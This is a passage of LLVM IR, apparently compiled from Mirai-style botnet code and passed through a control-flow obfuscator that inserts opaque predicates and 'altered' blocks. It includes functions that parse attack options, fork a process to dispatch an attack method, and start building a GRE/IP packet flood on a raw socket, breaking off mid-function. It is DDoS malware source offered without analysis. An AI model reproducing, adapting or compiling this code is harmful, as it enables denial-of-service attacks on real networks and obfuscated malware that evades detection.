  %417 = sub i32 %415, 1
  %418 = mul i32 %415, %417
  %419 = urem i32 %418, 2
  %420 = icmp eq i32 %419, 0
  %421 = icmp slt i32 %416, 10
  %422 = or i1 %420, %421
  br i1 %422, label %originalBB60, label %originalBB60alteredBB

originalBB60:                                     ; preds = %originalBB60alteredBB, %414
  %423 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %424 = bitcast %struct.attack_target* %423 to i8*
  call void @free(i8* %424) #6
  %425 = load i32, i32* @x.7
  %426 = load i32, i32* @y.8
  %427 = sub i32 %425, 1
  %428 = mul i32 %425, %427
  %429 = urem i32 %428, 2
  %430 = icmp eq i32 %429, 0
  %431 = icmp slt i32 %426, 10
  %432 = or i1 %430, %431
  br i1 %432, label %originalBBpart262, label %originalBB60alteredBB

originalBBpart262:                                ; preds = %originalBB60
  br label %433

; <label>:433:                                    ; preds = %originalBBpart262, %originalBBpart258
  %434 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %435 = icmp ne %struct.attack_option* %434, null
  br i1 %435, label %436, label %440

; <label>:436:                                    ; preds = %433
  %437 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %438 = load i8, i8* %9, align 1
  %439 = zext i8 %438 to i32
  call void @free_opts(%struct.attack_option* %437, i32 %439)
  br label %440

; <label>:440:                                    ; preds = %436, %433
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %17
  %441 = load i8*, i8** %3, align 8
  %442 = bitcast i8* %441 to i32*
  %443 = load i32, i32* %442, align 4
  %444 = call i32 @ntohl(i32 %443) #7
  store i32 %444, i32* %6, align 4
  %445 = load i8*, i8** %3, align 8
  %446 = getelementptr inbounds i8, i8* %445, i64 4
  store i8* %446, i8** %3, align 8
  %447 = load i32, i32* %4, align 4
  %448 = sext i32 %447 to i64
  %_ = shl i64 %448, 4
  %_1 = shl i64 %448, 4
  %_2 = sub i64 0, %448
  %gen = add i64 %_2, 4
  %449 = sub i64 %448, 4
  %450 = trunc i64 %449 to i32
  store i32 %450, i32* %4, align 4
  %451 = load i32, i32* %4, align 4
  %452 = icmp eq i32 %451, 0
  br label %originalBB

originalBB3alteredBB:                             ; preds = %originalBB3, %57
  br label %originalBB3

originalBB7alteredBB:                             ; preds = %originalBB7, %85
  br label %originalBB7

originalBB11alteredBB:                            ; preds = %originalBB11, %102
  %453 = load i32, i32* %4, align 4
  %454 = sext i32 %453 to i64
  %455 = load i8, i8* %8, align 1
  %456 = zext i8 %455 to i64
  %_12 = sub i64 5, %456
  %gen13 = mul i64 %_12, %456
  %_14 = shl i64 5, %456
  %_15 = sub i64 0, 5
  %gen16 = add i64 %_15, %456
  %_17 = shl i64 5, %456
  %_18 = sub i64 5, %456
  %gen19 = mul i64 %_18, %456
  %457 = mul i64 5, %456
  %458 = icmp ult i64 %454, %457
  br label %originalBB11

originalBB23alteredBB:                            ; preds = %originalBB23, %125
  br label %originalBB23

originalBB27alteredBB:                            ; preds = %originalBB27, %142
  %459 = load i8, i8* %8, align 1
  %460 = zext i8 %459 to i64
  %461 = call noalias i8* @calloc(i64 %460, i64 24) #6
  %462 = bitcast i8* %461 to %struct.attack_target*
  store %struct.attack_target* %462, %struct.attack_target** %10, align 8
  store i32 0, i32* %5, align 4
  br label %originalBB27

originalBB31alteredBB:                            ; preds = %originalBB31, %239
  %463 = load i32, i32* %4, align 4
  %464 = sext i32 %463 to i64
  %465 = icmp ult i64 %464, 1
  br label %originalBB31

originalBB35alteredBB:                            ; preds = %originalBB35, %259
  br label %originalBB35

originalBB39alteredBB:                            ; preds = %originalBB39, %276
  %466 = load i8*, i8** %3, align 8
  %467 = getelementptr inbounds i8, i8* %466, i32 1
  store i8* %467, i8** %3, align 8
  %468 = load i8, i8* %466, align 1
  %469 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %470 = load i32, i32* %5, align 4
  %471 = sext i32 %470 to i64
  %472 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %469, i64 %471
  %473 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %472, i32 0, i32 1
  store i8 %468, i8* %473, align 8
  %474 = load i32, i32* %4, align 4
  %475 = sext i32 %474 to i64
  %_40 = sub i64 %475, 1
  %gen41 = mul i64 %_40, 1
  %_42 = sub i64 %475, 1
  %gen43 = mul i64 %_42, 1
  %_44 = shl i64 %475, 1
  %476 = sub i64 %475, 1
  %477 = trunc i64 %476 to i32
  store i32 %477, i32* %4, align 4
  %478 = load i32, i32* %4, align 4
  %479 = sext i32 %478 to i64
  %480 = icmp ult i64 %479, 1
  br label %originalBB39

originalBB48alteredBB:                            ; preds = %originalBB48, %308
  br label %originalBB48

originalBB52alteredBB:                            ; preds = %originalBB52, %370
  br label %originalBB52

originalBB56alteredBB:                            ; preds = %originalBB56, %395
  %481 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %482 = icmp ne %struct.attack_target* %481, null
  br label %originalBB56

originalBB60alteredBB:                            ; preds = %originalBB60, %414
  %483 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %484 = bitcast %struct.attack_target* %483 to i8*
  call void @free(i8* %484) #6
  br label %originalBB60
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #2

declare void @util_memcpy(i8*, i8*, i32) #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #2

; Function Attrs: noinline nounwind uwtable
define void @attack_start(i32, i8 zeroext, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca i8, align 1
  %12 = alloca %struct.attack_option*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i8 %1, i8* %8, align 1
  store i8 %2, i8* %9, align 1
  store %struct.attack_target* %3, %struct.attack_target** %10, align 8
  store i8 %4, i8* %11, align 1
  store %struct.attack_option* %5, %struct.attack_option** %12, align 8
  %15 = call i32 @fork() #6
  store i32 %15, i32* %13, align 4
  %16 = load i32, i32* %13, align 4
  %17 = icmp sgt i32 %16, 0
  br i1 %17, label %21, label %18

; <label>:18:                                     ; preds = %6
  %19 = load i32, i32* %13, align 4
  %20 = icmp eq i32 %19, -1
  br i1 %20, label %21, label %22

; <label>:21:                                     ; preds = %18, %6
  ret void

; <label>:22:                                     ; preds = %18
  store i32 0, i32* %14, align 4
  store i32 0, i32* %14, align 4
  br label %23

; <label>:23:                                     ; preds = %54, %22
  %24 = load i32, i32* %14, align 4
  %25 = load i8, i8* @methods_len, align 1
  %26 = zext i8 %25 to i32
  %27 = icmp slt i32 %24, %26
  br i1 %27, label %28, label %57

; <label>:28:                                     ; preds = %23
  %29 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %30 = load i32, i32* %14, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %29, i64 %31
  %33 = load %struct.attack_method*, %struct.attack_method** %32, align 8
  %34 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %33, i32 0, i32 1
  %35 = load i8, i8* %34, align 8
  %36 = zext i8 %35 to i32
  %37 = load i8, i8* %8, align 1
  %38 = zext i8 %37 to i32
  %39 = icmp eq i32 %36, %38
  br i1 %39, label %40, label %53

; <label>:40:                                     ; preds = %28
  %41 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %42 = load i32, i32* %14, align 4
  %43 = sext i32 %42 to i64
  %44 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %41, i64 %43
  %45 = load %struct.attack_method*, %struct.attack_method** %44, align 8
  %46 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %45, i32 0, i32 0
  %47 = load void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %46, align 8
  %48 = load i32, i32* %7, align 4
  %49 = load i8, i8* %9, align 1
  %50 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %51 = load i8, i8* %11, align 1
  %52 = load %struct.attack_option*, %struct.attack_option** %12, align 8
  call void %47(i32 %48, i8 zeroext %49, %struct.attack_target* %50, i8 zeroext %51, %struct.attack_option* %52)
  br label %57

; <label>:53:                                     ; preds = %28
  br label %54

; <label>:54:                                     ; preds = %53
  %55 = load i32, i32* %14, align 4
  %56 = add nsw i32 %55, 1
  store i32 %56, i32* %14, align 4
  br label %23

; <label>:57:                                     ; preds = %40, %23
  call void @exit(i32 0) #8
  unreachable
}

; Function Attrs: nounwind
declare void @free(i8*) #1

; Function Attrs: noinline nounwind uwtable
define internal void @free_opts(%struct.attack_option*, i32) #0 {
  %3 = alloca %struct.attack_option*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store %struct.attack_option* %0, %struct.attack_option** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  %6 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %7 = icmp eq %struct.attack_option* %6, null
  br i1 %7, label %8, label %9

; <label>:8:                                      ; preds = %2
  br label %52

; <label>:9:                                      ; preds = %2
  store i32 0, i32* %5, align 4
  br label %10

; <label>:10:                                     ; preds = %originalBBpart2, %9
  %11 = load i32, i32* %5, align 4
  %12 = load i32, i32* %4, align 4
  %13 = icmp slt i32 %11, %12
  br i1 %13, label %14, label %49

; <label>:14:                                     ; preds = %10
  %15 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %16 = load i32, i32* %5, align 4
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %15, i64 %17
  %19 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %18, i32 0, i32 0
  %20 = load i8*, i8** %19, align 8
  %21 = icmp ne i8* %20, null
  br i1 %21, label %22, label %29

; <label>:22:                                     ; preds = %14
  %23 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %24 = load i32, i32* %5, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %23, i64 %25
  %27 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %26, i32 0, i32 0
  %28 = load i8*, i8** %27, align 8
  call void @free(i8* %28) #6
  br label %29

; <label>:29:                                     ; preds = %22, %14
  br label %30

; <label>:30:                                     ; preds = %29
  %31 = load i32, i32* @x.11
  %32 = load i32, i32* @y.12
  %33 = sub i32 %31, 1
  %34 = mul i32 %31, %33
  %35 = urem i32 %34, 2
  %36 = icmp eq i32 %35, 0
  %37 = icmp slt i32 %32, 10
  %38 = or i1 %36, %37
  br i1 %38, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %30
  %39 = load i32, i32* %5, align 4
  %40 = add nsw i32 %39, 1
  store i32 %40, i32* %5, align 4
  %41 = load i32, i32* @x.11
  %42 = load i32, i32* @y.12
  %43 = sub i32 %41, 1
  %44 = mul i32 %41, %43
  %45 = urem i32 %44, 2
  %46 = icmp eq i32 %45, 0
  %47 = icmp slt i32 %42, 10
  %48 = or i1 %46, %47
  br i1 %48, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %10

; <label>:49:                                     ; preds = %10
  %50 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %51 = bitcast %struct.attack_option* %50 to i8*
  call void @free(i8* %51) #6
  br label %52

; <label>:52:                                     ; preds = %49, %8
  %53 = load i32, i32* @x.11
  %54 = load i32, i32* @y.12
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBB3, label %originalBB3alteredBB

originalBB3:                                      ; preds = %originalBB3alteredBB, %52
  %61 = load i32, i32* @x.11
  %62 = load i32, i32* @y.12
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
  %68 = or i1 %66, %67
  br i1 %68, label %originalBBpart25, label %originalBB3alteredBB

originalBBpart25:                                 ; preds = %originalBB3
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %30
  %69 = load i32, i32* %5, align 4
  %_ = sub i32 %69, 1
  %gen = mul i32 %_, 1
  %_1 = sub i32 %69, 1
  %gen2 = mul i32 %_1, 1
  %70 = add nsw i32 %69, 1
  store i32 %70, i32* %5, align 4
  br label %originalBB

originalBB3alteredBB:                             ; preds = %originalBB3, %52
  br label %originalBB3
}

; Function Attrs: nounwind
declare i32 @fork() #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) #4

; Function Attrs: noinline nounwind uwtable
define i8* @attack_get_opt_str(i8 zeroext, %struct.attack_option*, i8 zeroext, i8*) #0 {
  %5 = alloca i8*, align 8
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i8* %3, i8** %9, align 8
  store i32 0, i32* %10, align 4
  store i32 0, i32* %10, align 4
  br label %11

; <label>:11:                                     ; preds = %67, %4
  %12 = load i32, i32* %10, align 4
  %13 = load i8, i8* %6, align 1
  %14 = zext i8 %13 to i32
  %15 = icmp slt i32 %12, %14
  br i1 %15, label %16, label %70

; <label>:16:                                     ; preds = %11
  %17 = load i32, i32* @x.13
  %18 = load i32, i32* @y.14
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %16
  %25 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %26 = load i32, i32* %10, align 4
  %27 = sext i32 %26 to i64
  %28 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %25, i64 %27
  %29 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %28, i32 0, i32 1
  %30 = load i8, i8* %29, align 8
  %31 = zext i8 %30 to i32
  %32 = load i8, i8* %8, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %31, %33
  %35 = load i32, i32* @x.13
  %36 = load i32, i32* @y.14
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %34, label %43, label %66

; <label>:43:                                     ; preds = %originalBBpart2
  %44 = load i32, i32* @x.13
  %45 = load i32, i32* @y.14
  %46 = sub i32 %44, 1
  %47 = mul i32 %44, %46
  %48 = urem i32 %47, 2
  %49 = icmp eq i32 %48, 0
  %50 = icmp slt i32 %45, 10
  %51 = or i1 %49, %50
  br i1 %51, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %43
  %52 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %53 = load i32, i32* %10, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %52, i64 %54
  %56 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %55, i32 0, i32 0
  %57 = load i8*, i8** %56, align 8
  store i8* %57, i8** %5, align 8
  %58 = load i32, i32* @x.13
  %59 = load i32, i32* @y.14
  %60 = sub i32 %58, 1
  %61 = mul i32 %58, %60
  %62 = urem i32 %61, 2
  %63 = icmp eq i32 %62, 0
  %64 = icmp slt i32 %59, 10
  %65 = or i1 %63, %64
  br i1 %65, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %72

; <label>:66:                                     ; preds = %originalBBpart2
  br label %67

; <label>:67:                                     ; preds = %66
  %68 = load i32, i32* %10, align 4
  %69 = add nsw i32 %68, 1
  store i32 %69, i32* %10, align 4
  br label %11

; <label>:70:                                     ; preds = %11
  %71 = load i8*, i8** %9, align 8
  store i8* %71, i8** %5, align 8
  br label %72

; <label>:72:                                     ; preds = %70, %originalBBpart24
  %73 = load i8*, i8** %5, align 8
  ret i8* %73

originalBBalteredBB:                              ; preds = %originalBB, %16
  %74 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %75 = load i32, i32* %10, align 4
  %76 = sext i32 %75 to i64
  %77 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %74, i64 %76
  %78 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %77, i32 0, i32 1
  %79 = load i8, i8* %78, align 8
  %80 = zext i8 %79 to i32
  %81 = load i8, i8* %8, align 1
  %82 = zext i8 %81 to i32
  %83 = icmp eq i32 %80, %82
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %43
  %84 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %85 = load i32, i32* %10, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %84, i64 %86
  %88 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %87, i32 0, i32 0
  %89 = load i8*, i8** %88, align 8
  store i8* %89, i8** %5, align 8
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_int(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 zeroext %11, %struct.attack_option* %12, i8 zeroext %13, i8* null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  %16 = icmp eq i8* %15, null
  br i1 %16, label %17, label %35

; <label>:17:                                     ; preds = %4
  %18 = load i32, i32* @x.15
  %19 = load i32, i32* @y.16
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %17
  %26 = load i32, i32* %9, align 4
  store i32 %26, i32* %5, align 4
  %27 = load i32, i32* @x.15
  %28 = load i32, i32* @y.16
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %54

; <label>:35:                                     ; preds = %4
  %36 = load i32, i32* @x.15
  %37 = load i32, i32* @y.16
  %38 = sub i32 %36, 1
  %39 = mul i32 %36, %38
  %40 = urem i32 %39, 2
  %41 = icmp eq i32 %40, 0
  %42 = icmp slt i32 %37, 10
  %43 = or i1 %41, %42
  br i1 %43, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %35
  %44 = load i8*, i8** %10, align 8
  %45 = call i32 @util_atoi(i8* %44, i32 10)
  store i32 %45, i32* %5, align 4
  %46 = load i32, i32* @x.15
  %47 = load i32, i32* @y.16
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %54

; <label>:54:                                     ; preds = %originalBBpart24, %originalBBpart2
  %55 = load i32, i32* %5, align 4
  ret i32 %55

originalBBalteredBB:                              ; preds = %originalBB, %17
  %56 = load i32, i32* %9, align 4
  store i32 %56, i32* %5, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %35
  %57 = load i8*, i8** %10, align 8
  %58 = call i32 @util_atoi(i8* %57, i32 10)
  store i32 %58, i32* %5, align 4
  br label %originalBB1
}

declare i32 @util_atoi(i8*, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_ip(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %5 = load i32, i32* @x.17
  %6 = load i32, i32* @y.18
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = alloca i32, align 4
  %14 = alloca i8, align 1
  %15 = alloca %struct.attack_option*, align 8
  %16 = alloca i8, align 1
  %17 = alloca i32, align 4
  %18 = alloca i8*, align 8
  store i8 %0, i8* %14, align 1
  store %struct.attack_option* %1, %struct.attack_option** %15, align 8
  store i8 %2, i8* %16, align 1
  store i32 %3, i32* %17, align 4
  %19 = load i8, i8* %14, align 1
  %20 = load %struct.attack_option*, %struct.attack_option** %15, align 8
  %21 = load i8, i8* %16, align 1
  %22 = call i8* @attack_get_opt_str(i8 zeroext %19, %struct.attack_option* %20, i8 zeroext %21, i8* null)
  store i8* %22, i8** %18, align 8
  %23 = load i8*, i8** %18, align 8
  %24 = icmp eq i8* %23, null
  %25 = load i32, i32* @x.17
  %26 = load i32, i32* @y.18
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %24, label %33, label %51

; <label>:33:                                     ; preds = %originalBBpart2
  %34 = load i32, i32* @x.17
  %35 = load i32, i32* @y.18
  %36 = sub i32 %34, 1
  %37 = mul i32 %34, %36
  %38 = urem i32 %37, 2
  %39 = icmp eq i32 %38, 0
  %40 = icmp slt i32 %35, 10
  %41 = or i1 %39, %40
  br i1 %41, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %33
  %42 = load i32, i32* %17, align 4
  store i32 %42, i32* %13, align 4
  %43 = load i32, i32* @x.17
  %44 = load i32, i32* @y.18
  %45 = sub i32 %43, 1
  %46 = mul i32 %43, %45
  %47 = urem i32 %46, 2
  %48 = icmp eq i32 %47, 0
  %49 = icmp slt i32 %44, 10
  %50 = or i1 %48, %49
  br i1 %50, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %54

; <label>:51:                                     ; preds = %originalBBpart2
  %52 = load i8*, i8** %18, align 8
  %53 = call i32 @inet_addr(i8* %52) #6
  store i32 %53, i32* %13, align 4
  br label %54

; <label>:54:                                     ; preds = %51, %originalBBpart24
  %55 = load i32, i32* %13, align 4
  ret i32 %55

originalBBalteredBB:                              ; preds = %originalBB, %4
  %56 = alloca i32, align 4
  %57 = alloca i8, align 1
  %58 = alloca %struct.attack_option*, align 8
  %59 = alloca i8, align 1
  %60 = alloca i32, align 4
  %61 = alloca i8*, align 8
  store i8 %0, i8* %57, align 1
  store %struct.attack_option* %1, %struct.attack_option** %58, align 8
  store i8 %2, i8* %59, align 1
  store i32 %3, i32* %60, align 4
  %62 = load i8, i8* %57, align 1
  %63 = load %struct.attack_option*, %struct.attack_option** %58, align 8
  %64 = load i8, i8* %59, align 1
  %65 = call i8* @attack_get_opt_str(i8 zeroext %62, %struct.attack_option* %63, i8 zeroext %64, i8* null)
  store i8* %65, i8** %61, align 8
  %66 = load i8*, i8** %61, align 8
  %67 = icmp eq i8* %66, null
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %33
  %68 = load i32, i32* %17, align 4
  store i32 %68, i32* %13, align 4
  br label %originalBB1
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_gre_ip(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i32, align 4
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca %struct.iphdr*, align 8
  %26 = alloca %struct.grehdr*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.udphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca %struct.iphdr*, align 8
  %31 = alloca %struct.grehdr*, align 8
  %32 = alloca %struct.iphdr*, align 8
  %33 = alloca %struct.udphdr*, align 8
  %34 = alloca i8*, align 8
  %35 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %36 = load i8, i8* %7, align 1
  %37 = zext i8 %36 to i64
  %38 = call noalias i8* @calloc(i64 %37, i64 8) #6
  %39 = bitcast i8* %38 to i8**
  store i8** %39, i8*** %13, align 8
  %40 = load i8, i8* %9, align 1
  %41 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %42 = call i32 @attack_get_opt_int(i8 zeroext %40, %struct.attack_option* %41, i8 zeroext 2, i32 0)
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %14, align 1
  %44 = load i8, i8* %9, align 1
  %45 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %46 = call i32 @attack_get_opt_int(i8 zeroext %44, %struct.attack_option* %45, i8 zeroext 3, i32 65535)
  %47 = trunc i32 %46 to i16
  store i16 %47, i16* %15, align 2
  %48 = load i8, i8* %9, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %50 = call i32 @attack_get_opt_int(i8 zeroext %48, %struct.attack_option* %49, i8 zeroext 4, i32 64)
  %51 = trunc i32 %50 to i8
  store i8 %51, i8* %16, align 1
  %52 = load i8, i8* %9, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 5, i32 1)
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %17, align 1
  %56 = load i8, i8* %9, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 6, i32 65535)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %18, align 2
  %60 = load i8, i8* %9, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 7, i32 65535)
  %63 = trunc i32 %62 to i16
  store i16 %63, i16* %19, align 2
  %64 = load i8, i8* %9, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 0, i32 512)
  store i32 %66, i32* %20, align 4
  %67 = load i8, i8* %9, align 1
  %68 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %69 = call i32 @attack_get_opt_int(i8 zeroext %67, %struct.attack_option* %68, i8 zeroext 1, i32 1)
  %70 = trunc i32 %69 to i8
  store i8 %70, i8* %21, align 1
  %71 = load i8, i8* %9, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 18, i32 0)
  %74 = trunc i32 %73 to i8
  store i8 %74, i8* %22, align 1
  %75 = load i8, i8* %9, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %77 = load i32, i32* @LOCAL_ADDR, align 4
  %78 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 19, i32 %77)
  store i32 %78, i32* %23, align 4
  %79 = call i64 @time(i64* null) #6
  %80 = load i32, i32* %6, align 4
  %81 = sext i32 %80 to i64
  %82 = add nsw i64 %79, %81
  %83 = trunc i64 %82 to i32
  store i32 %83, i32* %24, align 4
  %84 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %84, i32* %12, align 4
  %85 = icmp eq i32 %84, -1
  br i1 %85, label %86, label %87

; <label>:86:                                     ; preds = %5
  br label %659

; <label>:87:                                     ; preds = %5
  store i32 1, i32* %11, align 4
  %88 = load i32, i32* %12, align 4
  %89 = bitcast i32* %11 to i8*
